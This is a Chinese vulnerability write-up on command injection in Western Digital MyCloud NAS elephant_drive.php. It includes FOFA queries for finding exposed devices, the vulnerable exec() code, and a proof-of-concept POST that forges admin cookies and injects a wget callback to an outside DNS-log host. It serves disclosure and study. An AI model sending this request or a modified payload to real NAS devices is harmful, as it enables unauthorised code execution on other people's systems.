---
title: "西部数码 NAS elephant_drive.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-elephant_drive-rce.html
asset_dir: assets/西部数码-nas-elephant_drive.php-命令执行漏洞
---

# 西部数码 NAS elephant\_drive.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/11 13:05
- 546浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

web服务器

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨

服务器安全服务

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS elephant\_drive.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

云安全解决方案

网络安全会议

漏洞扫描服务

直接看 `elephant_drive.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$action = $_POST['attion'];
$_email = $_POST['e_email'];
$_password = $_POST['e_password'];
......
case "create":
{
    $ret = check_account($toURL, $check_agg);
    if ($ret == ERR_NONE) //The email not used
    {
       $reg_agg['t'] = exec("elephant_drive -p " . $_password); //get hash password
       $ret = create_account($toURL, $reg_agg);
```

深入探索

恶意软件分析工具

代码安全审计

Web安全课程

当attion=create时，`$_password` 是直接拼接进**exec**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

计算机驱动器和存储设备

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/backups/elephant_drive.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

attion=create&e_email=test@testxxxx.com&e_password=;wget elephant.dnslog.pt;
```

[![西部数码 NAS elephant_drive.php 命令执行漏洞](images/img-001-e9103337b84f.webp)](https://image.mrxn.net/ce5703c5b9f54e5b8c16a52c91399c42.webp)

成功在DNSLOG平台收到DNS和HTTP请求

硬盘驱动器

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKoElEQVR4AeycjXrzqA6E++793/OeDMqADNhx8iV1zn70qTLSaCQoMk3b/fnn5+fn3z+1f+8fR33ukgJndUX8xMuzfa3PS5jL6Hzm7B/lrHkGNZCbfn1+ywnUgdwm/fOMHX0Bsz5ZP8ubA35ga7nWPoTGsdA9MoqXwb4eIgdIWmzWI3P2i7h7ce4s5vI6kEwu/7oTGAYCDE8oNO7ZrUKrhfDdAyIGTE1vKVD2VEU7DoQOGu5ICw2hK8H9xU/1PdwAhB4abgRdAE0Ho9/JSzgMpLDr5bITWAO57OjnC791IEfXfba89UI4d6XdRzUyxxnF95bz9nuNYueg7cdcRmllmXuH/9aBvGNDf3uPjwwE2tOlp6g3Hzoc6yDyrnedECIHDcX3BpE/6pFrIPSvcLnmVf8jA/l5dTer7mcN5MsegmEgvtp7eLR/GK/7kT6vMdM57xxEf8DU5vcWk0D5vQWo+VluxnnNR+jaI3ylxzCQowVW7vMnUAcC7amCx/7R1vKTAdEr6+F1zn28BkQvGG+DtUIIneuE4mXybRA68TYYOedmCKGHc5h71IFkcvnXncAayHVnP135H1/VP8G+M7Sr6r5Z8yrnOiHEGrkvBKe8zXnHEBrAqYd4ptaaP8V1Qx6O43cFw0CA+iMjjL63By1nzpifEnPQ9BC+c0IYOfEy2M8pb/O6EHpo2GusFTonVCyDc7XQdLD11a832GpgGw8D6Rt8UfxXbOXUQPTE2HwqjoU9B23qzmVUjQyaTrEs6+yLlznOKN5m3nFG5zJCrD/jZrUQemhoXe5hH5rO3CM8NZBHTVb+fSewBvK+s3xLpzoQiOvlKyj0ChA5wNTmjb+Sd0e1NqBoHQshuLu8AJzjivj2oj4yiDqY401aPiHyJbi/qF4GkYPj3/altd1bVDAvrOTEUd7mtGNhHYiTC689gToQTUcG7WmZbQ0iL61tpjviZnVnOfeF/X24lxC2OogYcKv6F+Gsr8nkAOW2A4k95wKlNqu1nixzdSCZXP51J7AGct3ZT1euA4G4UrpCtmnFnYTQA3fmp1xJaPHP7eOol3NCoNTfSuonBAeBNfGEo94yl8i3wdi3zwEu3WCv2yTvgTXCO1W+RqCguYx1IJn8q/wv+2LrQDRF2aP9SdMbbCcOEQPTdsDuEzItuJMQddB+PIXG3WWlNwTfc44zQmihYf4as9Y+hLaPAVPTfeS+wEYDrH/J4efLPuoN+bJ9/bXbqQOB8fr4es1OB5reuhlC6HIP6yByMP8WZJ0x95j5R7pZztwMj/pnvXWPOOetz+icsA4kC5Z/3QmcGogmZ/NWHQshnnTnIGLA1PDmBe1WqEcVJgcodaaks8E2Z43QGiHs62DMwXOc1pBB1EH7uqBx2ldvqpNB050aSN9oxZ87gTWQz53tS52fHgi06wXh69rJZjsQL5vlIOqBWbr+0Q8o37qgoXr25ibQdObOontm/REHsZY1Qhg594PIQUPV2J4eiBsvPDyBl5PDQDwp4ayr+N5mOnMQT0Jf08cw6tzDWsdCCD2MqHxvELrMn+3rGoge0NA9oHFHeueEs9phIBIuu+4E6kBm0/K2oE0fRr/XORae7SutDMb+EJzyNvd9Fl0vhOgLDWf9pJXlnOJsOWc/5+07J5xxdSBOLrz2BNZArj3/YfU6EIhrOyhuhK6X7RaWT8fCQtxe5Pd2o4dPiLV6reIsVrxnED2gYa61Dy0PmN5gXmOTuAdA+bH7HhZwTQluLxAa4Ba9/lkH8nqLVfnOE/gHKNP3xDNC5KCh89A4CN8bg4gBUxs80yMXAGWPmXOPjDlvP+flQ/SC839zcq+MEH3MqbdtxjkHUQdYtsF1QzbHcX2wBnL9DDY7qP8FFVC+LUDDjfIeQOR9BYX3VAVxNgh9TSbHmowpXfdjDqIXYGqDQK2B8C2AbSwegsvrQ3DK9waRA/rUsC4w5XIhjJp1Q/IJfYH/9ED8NEGbbs/lr8u5jM5D6wHhz3TmXLeH1mXstbMcxNpAlQP1CTd5VDvLPeJy3v7TA/HmFn7mBNZAPnOuL3etA/GVOdvJeuFRDbSrD1tftTb3gKbpc46F1meEqJ1xqpHl3JEvrc06iP6AqSm6Dhi+7eUCaHkIvw4kC5d/3QnU39QhJuTpCo+2BaEHBhlw+GS4AEad1rXNdBA1zs0QQgPUNFD2VInkeL2MEHpov9GnkvqPl12Tc/adE5qDsa/ytnVDfFJfgvUXQ08o78tcRuczBzH1zPW+64R9TrH4PVO+N4g1c401M+4ol/X2rReamyHEPuAYXat+NhhrLrgh3trC2QmsgcxO5UJueFPPe4HxSjkPLTfjIPLO+ZoKIXLQULzMeiG0PGx95Z8xiPpZDUQOqGmg/BAADbU/GwTvuBbenGc564XrhtwO8Js+3/Kmrslme+ULhHjioGHuuedD0x+t63oY9c4JIfLye4PIAXUpoNykStwcCC7XQ3C3dP2E4KDhuiH1eL7DWQP5jjnUXdQ3dTPQro+5jNDysPWte3RVc97+US1s14EWu14IwbuXEIKDQOlsEJx0vUHkgD61id0r40bQBUD5FgftLwC5dt2Q7sCuDutAICaXNwTBQcM8TfuugdA5zgiRAzJd/b5XTTxwgMMnzn2NMOph5B4sW9PQaiF8JyFiwNQUgfo11IFMlf9H5H9lq2sgXzbJOhBf6RnmPUO7XhB+XwPBQ3vjyj1mPkTNLNf3z3HWQ/SAhs5DcHu1vc5xxlxrP+ftO5fRuRlmXR3ITLi43z+BYSAQTxI0zBP0FmecczN8Vj/rAW1Pzue+9p0TQtTIl0HE0FC8zT0yOvcOfNR3GMg7Fl09Xj+BNZDXz+4jlYcD8fWCdr1nnHcGobNG2OcAU6cRKD+nq58NgnvUxPpHOuch+kLDMzlrhNBqIXzvAyKGhqqxHQ7EooW/dwL1z+9e0pMUPstZD+P01c8GLQ/hn6mF0AKWl5sDbNDrCC2Uf8aszwjRP9c7n7net0YI+z0gcsD6H5j9HH78frL+tRfalOA539vunxDFEL2sEYrvTfyewX6PXOOemYNtLUQMc5z1MAetJq8hH/Zzys/MfTOu95DZSV3IrYFcePizpetA8rU548+amYN2fd3LuYxwTnfUwzkhtH4Qfl5PvnQ2xb3BWAcj19e5p7DP7cUQfaFhHche0eJ/9wSGgUCbFoz+0fYg9HpKbBAcNHQPa4QQeeeE4mUQOfk2CE66V829cr25R+gaiH3AiNYI3Q+azpzytmEgTiy85gTWQK45991VPzIQGK+lr6dwthvxvUH0MQ8RQ/sHXzBy1meE0D1a23kIPTR0Tuje8mWOhYpl8m2KZY6Finv7yED6RVa8PYGj6OMDgXjC8ibgHJdr5Oupsin+U4PYBzR0T68jNJcRosYcRAyY2vx9zSSw4aHddq318YF4IwvPncAayLlz+jXVMBBdmyM72pnrjjTKHemgXWlps8F+TjqIvPzevCaEBuglJQbKt5QSvPjitXI5RF/nhDlvfxiIEwuvOYE6EIgJwjk8u109CTJofY9qpbX1OvPCPqdYvEy+Ddq6gOmC0spKcH9RLAPKTYH2pnuXFJBGVoLuBaI209LKIHIw71sHkouXf90JrIFcd/bTlf8HAAD//3qrvlgAAAAGSURBVAMAEyonpMpqhb0AAAAASUVORK5CYII=)

手机扫码阅读
